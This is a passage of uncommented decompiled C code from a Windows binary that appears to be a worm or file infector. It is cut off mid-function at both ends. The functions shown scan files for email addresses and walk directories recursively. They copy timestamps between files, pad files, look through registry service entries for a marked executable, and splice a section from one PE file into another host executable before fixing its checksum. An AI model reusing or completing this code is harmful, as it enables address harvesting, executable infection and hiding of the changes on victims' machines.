  v2 = sub_403464(&byte_40F1FC, 0);
  if ( v2 <= 0 )
    return _strcmpi(Ext, &String2) != 0 ? -1 : -100;
  while ( 1 )
  {
    v3 = sub_403434(&byte_40F1FC, v1);
    if ( !_strcmpi(Ext, v3) )
      break;
    if ( ++v1 >= v2 )
      return _strcmpi(Ext, &String2) != 0 ? -1 : -100;
  }
  return v1;
}

//----- (00403CBB) --------------------------------------------------------
int __cdecl sub_403CBB(LPCSTR lpFileName, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite)
{
  HANDLE FileA; // edi

  FileA = CreateFileA(lpFileName, 0xC0000000, 3u, 0, 2u, 0x20u, 0);
  lpFileName = 0;
  if ( FileA == (HANDLE)-1 || !lpBuffer )
    return 0;
  WriteFile(FileA, lpBuffer, nNumberOfBytesToWrite, (LPDWORD)&lpFileName, 0);
  CloseHandle(FileA);
  return 1;
}

//----- (00403D0B) --------------------------------------------------------
DWORD __cdecl sub_403D0B(LPCSTR lpFileName)
{
  HANDLE FileA; // eax
  void *v2; // edi
  DWORD FileSize; // ebx

  FileA = CreateFileA(lpFileName, 0x80000000, 3u, 0, 3u, 0x27u, 0);
  lpFileName = 0;
  v2 = FileA;
  FileSize = -1;
  if ( FileA != (HANDLE)-1 )
  {
    FileSize = GetFileSize(FileA, (LPDWORD)&lpFileName);
    if ( lpFileName )
      FileSize = -1;
    CloseHandle(v2);
  }
  return FileSize;
}

//----- (00403D58) --------------------------------------------------------
int __cdecl sub_403D58(LPCSTR lpFileName)
{
  char v2[16]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h] BYREF

  sub_40174B(v2);
  if ( !sub_40174E((int)v2, lpFileName, (int)&v3, 1) )
    return 0;
  sub_401808((int)v2);
  return 1;
}

//----- (00403D8C) --------------------------------------------------------
char *__cdecl sub_403D8C(LPSTR lpTempFileName)
{
  signed int v1; // eax
  CHAR Buffer[260]; // [esp+4h] [ebp-118h] BYREF
  CHAR PrefixString[20]; // [esp+108h] [ebp-14h] BYREF

  sub_403624(PrefixString, 2, 5, 4);
  GetTempPathA(0x104u, Buffer);
  GetTempFileNameA(Buffer, PrefixString, 0, lpTempFileName);
  sub_403DFA(lpTempFileName);
  v1 = strlen(lpTempFileName);
  do
    --v1;
  while ( v1 >= 0 && lpTempFileName[v1] != 46 );
  return strcpy(&lpTempFileName[v1], &byte_40F1DC);
}

//----- (00403DFA) --------------------------------------------------------
BOOL __cdecl sub_403DFA(LPCSTR lpFileName)
{
  SetFileAttributesA(lpFileName, 0x20u);
  return DeleteFileA(lpFileName);
}

//----- (00403E11) --------------------------------------------------------
int __cdecl sub_403E11(char *Source, int a2, int a3)
{
  int v3; // esi
  size_t v4; // eax
  bool v5; // zf
  CHAR *v6; // eax
  HANDLE FirstFileA; // edi
  struct _WIN32_FIND_DATAA FindFileData; // [esp+8h] [ebp-348h] BYREF
  CHAR FileName[260]; // [esp+148h] [ebp-208h] BYREF
  char Destination[260]; // [esp+24Ch] [ebp-104h] BYREF

  v3 = 0;
  strcpy(FileName, Source);
  v4 = strlen(FileName);
  if ( v4 )
  {
    v5 = FindFileData.cAlternateFileName[v4 + 15] == 92;
    v6 = &FindFileData.cAlternateFileName[v4 + 15];
    if ( v5 )
    {
      *v6 = 0;
      v3 = 1;
    }
  }
  strcat(FileName, asc_40E0B0);
  FirstFileA = FindFirstFileA(FileName, &FindFileData);
  if ( FirstFileA != (HANDLE)-1 )
  {
    do
    {
      strcpy(Destination, Source);
      if ( !v3 )
        strcat(Destination, asc_40E044);
      strcat(Destination, FindFileData.cFileName);
      if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
      {
        if ( strcmp(FindFileData.cFileName, asc_40E0AC)
          && strcmp(FindFileData.cFileName, asc_40E0A8)
          && ((int (__cdecl *)(char *, int, int))a2)(Destination, 1, a3) )
        {
          sub_403E11(Destination, a2, a3);
        }
      }
      else if ( !((int (__cdecl *)(char *, _DWORD, int))a2)(Destination, 0, a3) )
      {
        break;
      }
    }
    while ( FindNextFileA(FirstFileA, &FindFileData) );
    FindClose(FirstFileA);
  }
  return 0;
}

//----- (00403F63) --------------------------------------------------------
int __cdecl sub_403F63(LPCSTR lpFileName, LONG lDistanceToMove)
{
  HANDLE FileA; // edi
  signed int FileSize; // esi
  DWORD FileSizeHigh; // [esp+Ch] [ebp-4h] BYREF
  int lpFileNamea; // [esp+18h] [ebp+8h]
  int lDistanceToMovea; // [esp+1Ch] [ebp+Ch]

  if ( lDistanceToMove < 77824 )
    return 0;
  SetFileAttributesA(lpFileName, 0x20u);
  FileA = CreateFileA(lpFileName, 0xC0000000, 3u, 0, 3u, 0x20u, 0);
  if ( FileA == (HANDLE)-1 )
    return 0;
  FileSize = GetFileSize(FileA, &FileSizeHigh);
  if ( FileSize <= lDistanceToMove )
  {
    SetFilePointer(FileA, 0, 0, 2u);
    lpFileNamea = lDistanceToMove - FileSize;
    if ( (lDistanceToMove - FileSize) / 0x80000 > 0 )
    {
      lDistanceToMovea = (lDistanceToMove - FileSize) / 0x80000;
      do
      {
        WriteFile(FileA, byte_411970, 0x80000u, &FileSizeHigh, 0);
        --lDistanceToMovea;
      }
      while ( lDistanceToMovea );
    }
    WriteFile(FileA, byte_411970, lpFileNamea % 0x80000, &FileSizeHigh, 0);
  }
  else
  {
    SetFilePointer(FileA, lDistanceToMove, 0, 0);
    SetEndOfFile(FileA);
  }
  CloseHandle(FileA);
  return 1;
}

//----- (0040402D) --------------------------------------------------------
BOOL __cdecl sub_40402D(LPCSTR lpFileName, LPFILETIME lpCreationTime)
{
  HANDLE FileA; // esi
  BOOL FileTime; // edi

  FileA = CreateFileA(lpFileName, 0x80000000, 3u, 0, 3u, 0x27u, 0);
  if ( FileA == (HANDLE)-1 )
    return 0;
  FileTime = GetFileTime(FileA, lpCreationTime, lpCreationTime + 1, lpCreationTime + 2);
  CloseHandle(FileA);
  return FileTime;
}

//----- (00404075) --------------------------------------------------------
BOOL __cdecl sub_404075(LPCSTR lpFileName, FILETIME *lpCreationTime)
{
  HANDLE FileA; // esi
  BOOL v4; // edi

  FileA = CreateFileA(lpFileName, 0xC0000000, 3u, 0, 3u, 0x27u, 0);
  if ( FileA == (HANDLE)-1 )
    return 0;
  v4 = SetFileTime(FileA, lpCreationTime, lpCreationTime + 1, lpCreationTime + 2);
  CloseHandle(FileA);
  return v4;
}

//----- (004040BD) --------------------------------------------------------
LPVOID __cdecl sub_4040BD(LPCSTR lpFileName, int a2, int a3)
{
  LPVOID result; // eax
  int v4; // ebx
  unsigned int v5; // edx
  void *v6; // esi
  int v7; // eax
  char v8[16]; // [esp+4h] [ebp-14h] BYREF
  int v9; // [esp+14h] [ebp-4h] BYREF

  sub_40174B(v8);
  result = sub_40174E((int)v8, lpFileName, (int)&v9, 1);
  v4 = (int)result;
  if ( result )
  {
    if ( a3 )
    {
      if ( (unsigned int)v9 > 0x19000 )
      {
        v5 = (sub_404687(0) % 0xAu + 76) << 10;
        if ( v5 < v9 )
          v9 = v5;
      }
    }
    v6 = operator new(2 * v9);
    if ( v6 )
    {
      memset(v6, 0, 2 * v9);
      v7 = sub_401000(v4, (int)v6, v9, 72);
      if ( a2 )
        *(_DWORD *)a2 = v7;
    }
    sub_401808((int)v8);
    return v6;
  }
  return result;
}

//----- (00404156) --------------------------------------------------------
char *__cdecl sub_404156(char *Destination, int a2, char *a3, int a4)
{
  char *result; // eax
  unsigned int v6; // eax
  unsigned int v7; // et2
  unsigned int v8; // eax
  unsigned int v9; // et2
  unsigned int v10; // eax
  char *v11; // eax
  unsigned int v12; // eax
  char *v13; // eax
  unsigned int v14; // eax
  char *v15; // eax
  char Source[260]; // [esp+Ch] [ebp-104h] BYREF
  unsigned int Destinationa; // [esp+118h] [ebp+8h]
  unsigned int Destinationb; // [esp+118h] [ebp+8h]
  unsigned int Destinationc; // [esp+118h] [ebp+8h]

  Source[0] = 0;
  result = (char *)memset(Destination, 0, 0x14u);
  if ( FileName[0] )
  {
    v6 = sub_404687(0);
    v7 = v6 % 3;
    result = (char *)(v6 / 3);
    if ( v7 )
    {
      result = (char *)sub_403944(FileName, Source, 3, 10, 1);
      if ( result )
        result = strcpy(Destination, Source);
    }
  }
  if ( !*Destination )
  {
    if ( FullPath )
    {
      v8 = sub_404687(0);
      v9 = v8 % 3;
      result = (char *)(v8 / 3);
      if ( v9 )
      {
        _splitpath(&FullPath, 0, 0, Source, 0);
        result = strcpy(Destination, Source);
      }
    }
    if ( !*Destination )
    {
      result = (char *)sub_404687(0);
      if ( ((unsigned __int8)result & 0xF) == 0 )
      {
        Destinationa = sub_403464(a2_0, 0);
        v10 = sub_404687(0);
        v11 = sub_403434(a2_0, v10 % Destinationa);
        result = strcpy(Destination, v11);
      }
      if ( !*Destination )
        result = (char *)sub_403624(Destination, 2, 6, 4);
    }
  }
  if ( a2 )
  {
    Destinationb = sub_403464(&byte_40F1FC, 0);
    v12 = sub_404687(0);
    v13 = sub_403434(&byte_40F1FC, v12 % Destinationb);
    result = strcat(Destination, v13);
  }
  if ( a3 )
    return strcat(Destination, a3);
  if ( a4 )
  {
    Destinationc = sub_403464(&byte_40F1DC, 0);
    v14 = sub_404687(0);
    v15 = sub_403434(&byte_40F1DC, v14 % Destinationc);
    return strcat(Destination, v15);
  }
  return result;
}

//----- (004042C9) --------------------------------------------------------
int __cdecl sub_4042C9(int a1, int a2, void *a3, size_t Size, int a5)
{
  int v5; // edi
  char *v7; // ebx
  char *i; // eax
  __int16 v9; // bx
  signed int v10; // edi
  int v11; // eax
  signed int v13; // [esp+10h] [ebp-Ch]
  int v14; // [esp+10h] [ebp-Ch]
  int v15; // [esp+14h] [ebp-8h]
  int v16; // [esp+14h] [ebp-8h]
  int v17; // [esp+18h] [ebp-4h]
  int v18; // [esp+24h] [ebp+8h]
  int v19; // [esp+28h] [ebp+Ch]

  v5 = -1;
  v17 = 0;
  v15 = -1;
  v13 = 0;
  *(_DWORD *)a5 = 0;
  memset(a3, 0, Size);
  if ( sub_403B18(*(_BYTE *)a1) )
  {
    if ( sub_403B18(*(_BYTE *)a1) )
    {
      v7 = (char *)a1;
      for ( i = (char *)a3 - a1; ; i = (char *)a3 - a1 )
      {
        v7[(_DWORD)i] = *v7;
        if ( *v7 == 64 )
          v15 = v13;
        if ( *v7 == 46 )
          v5 = v13;
        ++v17;
        ++v7;
        ++v13;
        if ( v17 >= a2 - 1 || v13 >= (int)(Size - 1) || !sub_403B18(*v7) )
          break;
      }
    }
    *((_BYTE *)a3 + v13) = 0;
    if ( v5 - v15 > 2 && v15 > 1 )
    {
LABEL_26:
      *(_DWORD *)a5 = 1;
      return a1 + v17;
    }
  }
  v16 = -1;
  v14 = -1;
  v17 = 0;
  v9 = *(_WORD *)a1;
  v10 = 0;
  if ( sub_403B72(*(_WORD *)a1) )
  {
    if ( sub_403B72(v9) )
    {
      v11 = a2 - 1;
      v19 = 0;
      v18 = v11;
      do
      {
        *((_BYTE *)a3 + v10) = v9;
        if ( (_BYTE)v9 == 64 )
          v16 = v10;
        if ( (_BYTE)v9 == 46 )
          v14 = v10;
        v19 += 4;
        v17 += 2;
        ++v10;
        if ( v19 >= v18 )
          break;
        if ( v10 >= (int)(Size - 1) )
          break;
        v9 = *(_WORD *)(v17 + a1);
      }
      while ( sub_403B72(v9) );
    }
    *((_BYTE *)a3 + v10) = 0;
    if ( v14 - v16 <= 2 || v16 <= 1 )
      return a1 + v17;
    goto LABEL_26;
  }
  return a1 + 1;
}

//----- (00404426) --------------------------------------------------------
int __cdecl sub_404426(LPCSTR lpFileName, char *Destination, int a3, int a4)
{
  int v4; // ebx
  LPVOID v5; // eax
  LPVOID v6; // esi
  int v8; // edi
  char Source[1024]; // [esp+8h] [ebp-418h] BYREF
  char v10[16]; // [esp+408h] [ebp-18h] BYREF
  int v11; // [esp+418h] [ebp-8h] BYREF
  int v12; // [esp+41Ch] [ebp-4h] BYREF

  v4 = 0;
  v12 = 0;
  sub_40174B(v10);
  v5 = sub_40174E((int)v10, lpFileName, (int)&v11, 1);
  v6 = v5;
  if ( !v5 )
    return 0;
  v8 = (int)v5;
  while ( v8 - (int)v6 < v11 - 3 )
  {
    v8 = sub_4042C9(v8, (int)v6 + v11 - v8 - 3, Source, 0x400u, (int)&v12);
    if ( v12 )
    {
      if ( sub_4033AA(Destination, Source, a3, a4) > 0 )
        ++v4;
    }
  }
  sub_401808((int)v10);
  return v4;
}

//----- (004044C0) --------------------------------------------------------
int __cdecl sub_4044C0(HKEY hKey, LPCSTR lpSubKey, LPCSTR lpValueName, LPBYTE lpData, HKEY phkResult)
{
  DWORD Type; // [esp+0h] [ebp-8h] BYREF
  DWORD cbData; // [esp+4h] [ebp-4h] BYREF

  Type = -1;
  cbData = (DWORD)phkResult;
  memset(lpData, 0, (size_t)phkResult);
  if ( RegOpenKeyA(hKey, lpSubKey, &phkResult) )
    return 1;
  RegQueryValueExA(phkResult, lpValueName, 0, &Type, lpData, &cbData);
  RegCloseKey(phkResult);
  return 0;
}

//----- (0040451C) --------------------------------------------------------
int __cdecl sub_40451C(HKEY hKey, LPCSTR lpSubKey, LPCSTR lpValueName, BYTE *lpData)
{
  DWORD v5; // eax

  if ( RegCreateKeyA(hKey, lpSubKey, (PHKEY)&lpSubKey) )
    return 1;
  v5 = strlen((const char *)lpData);
  RegSetValueExA((HKEY)lpSubKey, lpValueName, 0, 1u, lpData, v5);
  RegCloseKey((HKEY)lpSubKey);
  return 0;
}

//----- (00404562) --------------------------------------------------------
int __cdecl sub_404562(HKEY hKey, LPCSTR lpSubKey, int a3, int a4)
{
  DWORD v4; // esi
  int v6; // eax
  int v7; // esi
  CHAR Name[260]; // [esp+4h] [ebp-10Ch] BYREF
  int v9; // [esp+108h] [ebp-8h] BYREF
  HKEY phkResult; // [esp+10Ch] [ebp-4h] BYREF

  v4 = 0;
  if ( RegOpenKeyA(hKey, lpSubKey, &phkResult) )
    return 0;
  while ( !RegEnumKeyA(phkResult, v4, Name, 0x104u) )
  {
    if ( a3 )
    {
      v9 = 0;
      v6 = ((int (__cdecl *)(HKEY, LPCSTR, CHAR *, int *, int))a3)(hKey, lpSubKey, Name, &v9, a4);
      if ( v9 )
      {
        v7 = v6;
        goto LABEL_9;
      }
    }
    ++v4;
  }
  v7 = 1;
LABEL_9:
  RegCloseKey(phkResult);
  return v7;
}

//----- (004045E0) --------------------------------------------------------
int __cdecl sub_4045E0(HKEY hKey, LPCSTR lpSubKey, int a3, int a4)
{
  DWORD v4; // ebx
  int v6; // eax
  int v7; // esi
  char Data[1024]; // [esp+8h] [ebp-814h] BYREF
  CHAR ValueName[1024]; // [esp+408h] [ebp-414h] BYREF
  DWORD Type; // [esp+808h] [ebp-14h] BYREF
  DWORD cchValueName; // [esp+80Ch] [ebp-10h] BYREF
  int v12; // [esp+810h] [ebp-Ch] BYREF
  DWORD cbData; // [esp+814h] [ebp-8h] BYREF
  HKEY phkResult; // [esp+818h] [ebp-4h] BYREF

  v4 = 0;
  cchValueName = 1024;
  cbData = 1024;
  if ( RegOpenKeyA(hKey, lpSubKey, &phkResult) )
    return 0;
  while ( 1 )
  {
    cchValueName = 1024;
    cbData = 1024;
    if ( RegEnumValueA(phkResult, v4, ValueName, &cchValueName, 0, &Type, (LPBYTE)Data, &cbData) )
      break;
    if ( Type == 1 )
    {
      if ( a3 )
      {
        v12 = 0;
        v6 = ((int (__cdecl *)(HKEY, LPCSTR, CHAR *, int *, int))a3)(hKey, lpSubKey, ValueName, &v12, a4);
        if ( v12 )
        {
          v7 = v6;
          goto LABEL_10;
        }
      }
    }
    ++v4;
  }
  v7 = 1;
LABEL_10:
  RegCloseKey(phkResult);
  return v7;
}
// 4045E0: using guessed type BYTE Data[1024];

//----- (00404687) --------------------------------------------------------
int __cdecl sub_404687(int a1)
{
  int TickCount; // eax

  if ( a1 || !dword_41196C )
  {
    TickCount = GetTickCount();
    sub_407B55(TickCount);
    dword_41196C = rand();
  }
  return rand();
}
// 41196C: using guessed type int dword_41196C;

//----- (004046B3) --------------------------------------------------------
HANDLE __cdecl sub_4046B3(LPCSTR lpApplicationName, LPSTR lpCommandLine)
{
  BOOL v2; // eax
  struct _STARTUPINFOA StartupInfo; // [esp+4h] [ebp-54h] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+48h] [ebp-10h] BYREF

  memset(&StartupInfo, 0, sizeof(StartupInfo));
  StartupInfo.cb = 68;
  v2 = CreateProcessA(lpApplicationName, lpCommandLine, 0, 0, 0, 0, 0, 0, &StartupInfo, &ProcessInformation);
  return v2 ? ProcessInformation.hProcess : 0;
}

//----- (004046F6) --------------------------------------------------------
const char *__cdecl sub_4046F6(LPCSTR lpFileName)
{
  int v1; // ebx
  const char *result; // eax
  const char *v3; // edi
  int v4; // esi
  char v5[16]; // [esp+8h] [ebp-14h] BYREF
  int v6; // [esp+18h] [ebp-4h] BYREF

  sub_40174B(v5);
  v1 = 0;
  result = (const char *)sub_40174E((int)v5, lpFileName, (int)&v6, 1);
  v3 = result;
  if ( result )
  {
    v4 = 4096;
    if ( (unsigned int)(v6 - 1000) > 0x1000 )
    {
      while ( strcmp(&String1, &v3[v4]) )
      {
        if ( ++v4 >= (unsigned int)(v6 - 1000) )
          goto LABEL_7;
      }
      v1 = 1;
    }
LABEL_7:
    sub_401808((int)v5);
    return (const char *)v1;
  }
  return result;
}

//----- (00404769) --------------------------------------------------------
int __cdecl sub_404769(HKEY hKey, char *Source, LPCSTR lpValueName, int a4, int a5)
{
  BYTE Data[1024]; // [esp+0h] [ebp-400h] BYREF

  if ( !sub_403B7D((char *)lpValueName, aZ) )
    return 1;
  Data[0] = 0;
  sub_4044C0(hKey, Source, lpValueName, Data, (HKEY)0x400);
  if ( !sub_4046F6((LPCSTR)Data) )
    return 1;
  *(_DWORD *)a5 = 1;
  *(_DWORD *)a4 = 1;
  strcpy(Destination, Source);
  strcpy((char *)&ApplicationName, (const char *)Data);
  strcpy(ServiceName, lpValueName);
  return 0;
}

//----- (004047FD) --------------------------------------------------------
int __cdecl sub_4047FD(HKEY hKey, char *Source, char *a3, int a4, int a5)
{
  BYTE Data[1024]; // [esp+0h] [ebp-800h] BYREF
  char Destination[1024]; // [esp+400h] [ebp-400h] BYREF

  strcpy(Destination, Source);
  strcat(Destination, asc_40E044);
  strcat(Destination, a3);
  if ( !sub_403B7D(Destination, aZ) )
    return 1;
  Data[0] = 0;
  sub_4044C0(hKey, Destination, ValueName, Data, (HKEY)0x400);
  if ( !sub_4046F6((LPCSTR)Data) )
    return 1;
  *(_DWORD *)a5 = 1;
  *(_DWORD *)a4 = 1;
  strcpy(::Destination, Source);
  strcpy((char *)&ApplicationName, (const char *)Data);
  strcpy(ServiceName, a3);
  return 0;
}

//----- (004048CB) --------------------------------------------------------
int sub_4048CB()
{
  char *v0; // eax
  int i; // esi
  size_t v2; // eax
  CHAR Buffer[260]; // [esp+0h] [ebp-51Ch] BYREF
  char Source[1024]; // [esp+104h] [ebp-418h] BYREF
  char Destination; // [esp+504h] [ebp-18h] BYREF
  char String[19]; // [esp+505h] [ebp-17h] BYREF
  int v8; // [esp+518h] [ebp-4h] BYREF

  v8 = 0;
  if ( dword_491E88 )
  {
    sub_403BD8(Source, 2);
    strcpy(::Destination, Source);
    sub_4045E0(HKEY_LOCAL_MACHINE, Source, (int)sub_404769, (int)&v8);
  }
  else
  {
    v0 = sub_403434(SubKey, 4);
    sub_404562(HKEY_LOCAL_MACHINE, v0, (int)sub_4047FD, (int)&v8);
  }
  dword_491E8C = v8;
  if ( !v8 )
  {
    GetSystemDirectoryA(Buffer, 0x104u);
    for ( i = 0; i < 10; ++i )
    {
      strcpy(&Destination, aZ);
      v2 = strlen(&Destination);
      sub_403624(&String[v2 - 1], 2, 4, 4);
      _strlwr(String);
      strcpy(Source, Buffer);
      strcat(Source, asc_40E044);
      strcat(Source, &Destination);
      strcat(Source, &byte_40F1DC);
      if ( !sub_403D58(Source) )
        break;
    }
    strcat(ServiceName, &Destination);
    strcpy((char *)&ApplicationName, Source);
  }
  return 1;
}
// 491E88: using guessed type int dword_491E88;
// 491E8C: using guessed type int dword_491E8C;
// 4048CB: using guessed type char String[19];

//----- (00404A28) --------------------------------------------------------
__int16 *__cdecl sub_404A28(__int16 *a1, __int16 a2)
{
  __int16 *result; // eax
  __int16 v3; // cx
  __int16 v4; // cx

  result = a1;
  a1[1] += a2;
  v3 = a1[1];
  while ( v3 < 1 )
  {
    a1[1] += 30;
    v3 = a1[1];
    --*a1;
  }
  if ( a1[1] > 31 )
  {
    do
    {
      a1[1] -= 30;
      v4 = a1[1];
      ++*a1;
    }
    while ( v4 > 31 );
  }
  if ( *a1 < 1 )
    *a1 += 12;
  if ( *a1 > 12 )
    *a1 -= 12;
  return result;
}

//----- (00404A85) --------------------------------------------------------
int __cdecl sub_404A85(int a1, char *Destination, char *a3)
{
  char *v3; // eax
  char v4; // cl
  int i; // edx
  const char *v6; // edx

  *Destination = 0;
  *a3 = 0;
  if ( *(_BYTE *)a1 != 92 || *(_BYTE *)(a1 + 1) != 92 )
    return 1;
  strcpy(Destination, asc_40E0B8);
  v3 = (char *)(a1 + 2);
  v4 = *(_BYTE *)(a1 + 2);
  for ( i = 2; v4 != 92; v4 = *++v3 )
  {
    if ( !v4 )
      break;
    ++i;
    Destination[(_DWORD)v3 - a1] = *v3;
  }
  Destination[i] = 0;
  v6 = (const char *)(a1 + i);
  if ( *v6 )
  {
    strcpy(a3, v6);
    return 0;
  }
  return 2;
}

//----- (00404AFC) --------------------------------------------------------
BOOL sub_404AFC()
{
  char Dir[260]; // [esp+4h] [ebp-410h] BYREF
  char Destination[260]; // [esp+108h] [ebp-30Ch] BYREF
  char String2[260]; // [esp+20Ch] [ebp-208h] BYREF
  CHAR Filename[260]; // [esp+310h] [ebp-104h] BYREF

  strcpy(Destination, (const char *)&ApplicationName);
  GetModuleFileNameA(0, Filename, 0x104u);
  _splitpath(Destination, 0, Dir, 0, 0);
  _splitpath(Filename, 0, String2, 0, 0);
  return _strcmpi(Dir, String2) == 0;
}

//----- (00404B78) --------------------------------------------------------
unsigned int __cdecl sub_404B78(int a1, unsigned int a2)
{
  unsigned int v2; // edx

  if ( a2 >= 0x44
    && *(_BYTE *)a1 == 77
    && *(_BYTE *)(a1 + 1) == 90
    && (v2 = *(unsigned __int16 *)(a1 + 60), v2 <= a2 - 4) )
  {
    return *(_DWORD *)(a1 + *(unsigned __int16 *)(a1 + 60)) == 17744 ? v2 : 0;
  }
  else
  {
    return 0;
  }
}

//----- (00404BB7) --------------------------------------------------------
_DWORD *__cdecl sub_404BB7(int a1, unsigned int a2, unsigned int a3)
{
  unsigned int v3; // eax
  unsigned int v4; // ecx
  unsigned int v5; // edx
  int v6; // eax
  unsigned int v7; // ecx
  unsigned int v8; // esi
  unsigned int v9; // edi
  _DWORD *result; // eax
  unsigned int v11; // edx

  v3 = sub_404B78(a1, a3);
  if ( v3 )
  {
    v4 = v3 + a1;
    v5 = *(_DWORD *)(v3 + a1 + 116);
    v6 = v3 + a1 + 116;
    if ( v5 >= a2 )
    {
      v7 = *(unsigned __int16 *)(v4 + 6);
      v8 = *(_DWORD *)(v6 + 8 * a2 - 4);
      v9 = 0;
      result = (_DWORD *)(v6 + 4 + 8 * v5 + 8);
      if ( v7 )
      {
        while ( (unsigned int)result - a1 < a3 - 4 )
        {
          v11 = result[1];
          if ( v11 + *result <= v8 || v11 > v8 )
          {
            result += 10;
            if ( ++v9 < v7 )
              continue;
          }
          if ( v9 < v7 )
            return result;
          return 0;
        }
      }
    }
  }
  return 0;
}

//----- (00404C27) --------------------------------------------------------
int __cdecl sub_404C27(int a1, int a2, int a3, unsigned int a4, unsigned int a5)
{
  int v7; // eax
  unsigned int *v8; // eax
  unsigned int v9; // eax
  int v11; // [esp+14h] [ebp+8h]
  int v12; // [esp+18h] [ebp+Ch]

  v12 = a2 + 16;
  if ( a2 - a1 + 16 > a5 )
    return 0;
  v11 = 0;
  if ( *(unsigned __int16 *)(a2 + 12) + *(unsigned __int16 *)(a2 + 14) > 0 )
  {
    while ( v12 - a1 + 8 <= a5 )
    {
      v7 = *(_DWORD *)(v12 + 4);
      if ( v7 >= 0 )
      {
        v8 = (unsigned int *)(a1 + v7);
        *v8 += a4 - a3;
        v9 = *v8;
        if ( v9 < a4 || v9 >= a4 + a5 )
          return 0;
      }
      else if ( !sub_404C27(a1, a1 + (v7 & 0x7FFFFFFF), a3, a4, a5) )
      {
        return 0;
      }
      v12 += 8;
      if ( ++v11 >= *(unsigned __int16 *)(a2 + 12) + *(unsigned __int16 *)(a2 + 14) )
        return 1;
    }
  }
  return 1;
}

//----- (00404CCD) --------------------------------------------------------
int __cdecl sub_404CCD(LPCSTR a1, LPCSTR lpFileName, int a3)
{
  char *v3; // ebx
  const CHAR *v5; // eax
  _DWORD *v6; // edi
  _DWORD *v7; // esi
  unsigned int v8; // eax
  unsigned int v9; // ebx
  LPCSTR v10; // ecx
  int v11; // eax
  LONG v12; // edi
  size_t v13; // edx
  char *v14; // esi
  CHAR *v15; // edi
  LONG v16; // eax
  char v17[16]; // [esp+8h] [ebp-3Ch] BYREF
  char v18[16]; // [esp+18h] [ebp-2Ch] BYREF
  const CHAR *v19; // [esp+28h] [ebp-1Ch]
  int v20; // [esp+2Ch] [ebp-18h]
  LONG lDistanceToMove; // [esp+30h] [ebp-14h]
  char *v22; // [esp+34h] [ebp-10h]
  int v23; // [esp+38h] [ebp-Ch]
  int v24; // [esp+3Ch] [ebp-8h] BYREF
  int v25; // [esp+40h] [ebp-4h] BYREF
  LPCSTR lpFileNamea; // [esp+50h] [ebp+Ch]
  unsigned int lpFileNameb; // [esp+50h] [ebp+Ch]
  int v28; // [esp+54h] [ebp+10h]
  int v29; // [esp+54h] [ebp+10h]

  sub_40174B(v18);
  sub_40174B(v17);
  v24 = 0;
  v25 = 0;
  v23 = 0;
  lDistanceToMove = 0;
  v3 = (char *)sub_40174E((int)v17, lpFileName, (int)&v25, 1);
  v22 = v3;
  if ( !v3 )
    return 0;
  sub_403F63(a1, v25 + a3 + 4096);
  v5 = (const CHAR *)sub_40174E((int)v18, a1, (int)&v24, 0);
  lpFileNamea = v5;
  if ( v5 )
  {
    v6 = sub_404BB7((int)v5, 3u, v24);
    if ( v6 )
    {
      v7 = sub_404BB7((int)v3, 3u, v25);
      if ( v7 )
      {
        v28 = sub_404B78((int)v3, v25);
        v8 = sub_404B78((int)lpFileNamea, v24);
        v9 = *(_DWORD *)&v3[v28 + 140];
        v10 = lpFileNamea;
        v19 = &lpFileNamea[v8];
        *((_DWORD *)v19 + 35) = v9;
        v29 = v6[1];
        lpFileNameb = v9 + v29;
        v6[2] = v7[2];
        *v6 = *v7;
        v11 = v6[3];
        v12 = v11 + v6[2];
        v20 = v7[1];
        v13 = v7[2];
        v14 = &v22[v7[3]];
        lDistanceToMove = v12;
        v15 = (CHAR *)&v10[v11];
        if ( (unsigned int)&v14[v13 - (_DWORD)v22] <= v25 )
        {
          memcpy(v15, v14, v13);
          v23 = sub_404C27((int)v15, (int)v15, v20, v29, v9);
          if ( (lpFileNameb & 0xFFF) != 0 )
            lpFileNameb = ((lpFileNameb >> 12) + 1) << 12;
          *((_DWORD *)v19 + 20) = lpFileNameb;
        }
      }
    }
    sub_401808((int)v18);
  }
  sub_401808((int)v17);
  if ( v23 )
  {
    v16 = lDistanceToMove;
    if ( lDistanceToMove < (unsigned int)v25 )
      v16 = v25;
    sub_403F63(a1, v16);
    sub_404FA3(a1);
  }
  return v23;
}

//----- (00404E60) --------------------------------------------------------
int __cdecl sub_404E60(LPCSTR lpFileName, int a2)
{
  int v2; // esi
  LPVOID v3; // eax
  int v4; // ebx
  unsigned int v6; // edi
  _DWORD *v7; // eax
  _DWORD *v8; // esi
  unsigned int v9; // ecx
  unsigned int v10; // ecx
  unsigned int v11; // edi
  int v12; // eax
  char v13[16]; // [esp+8h] [ebp-14h] BYREF
  int v14; // [esp+18h] [ebp-4h] BYREF

  sub_40174B(v13);
  v2 = 0;
  v3 = sub_40174E((int)v13, lpFileName, (int)&v14, 0);
  v4 = (int)v3;
  if ( !v3 )
    return 0;
  v6 = sub_404B78((int)v3, v14);
  if ( v6 && (v7 = sub_404BB7(v4, 3u, v14)) != 0 )
  {
    v8 = (_DWORD *)(v6 + v4);
    *(_DWORD *)(v6 + v4 + 140) = 16;
    v9 = v7[1] + 16;
    *v7 = 16;
    v7[2] = 16;
    if ( (v9 & 0xFFF) != 0 )
      v9 = ((v9 >> 12) + 1) << 12;
    v8[20] = v9;
    v10 = v7[3];
    v11 = v10 + v7[2];
    if ( v11 < a2 )
      v11 = a2;
    if ( (v11 & 0xFFF) != 0 )
      v11 = ((v11 >> 12) + 1) << 12;
    if ( v10 < v14 )
      memset((void *)(v10 + v4), 0, 0x10u);
    v12 = v8[59];
    if ( v12 )
      v8[10] = v12;
    v2 = 1;
  }
  else
  {
    v11 = (unsigned int)lpFileName;
  }
  sub_401808((int)v13);
  if ( v2 )
    sub_403F63(lpFileName, v11);
  sub_404FA3(lpFileName);
  return v2;
}

//----- (00404F50) --------------------------------------------------------
unsigned int __cdecl sub_404F50(_WORD *a1, unsigned int a2)
{
  unsigned int v2; // ecx
  unsigned int v4; // esi
  unsigned int v5; // eax
  __int16 v7; // [esp+0h] [ebp-4h]

  v2 = 0;
  v7 = 0;
  if ( a2 >> 1 )
  {
    v4 = a2 >> 1;
    do
    {
      v2 = (((unsigned __int16)*a1 + v2) >> 16) + (unsigned __int16)(*a1 + v2);
      ++a1;
      --v4;
    }
    while ( v4 );
    v7 = v2;
  }
  v5 = HIWORD(v2);
  LOWORD(v5) = v7 + HIWORD(v2);
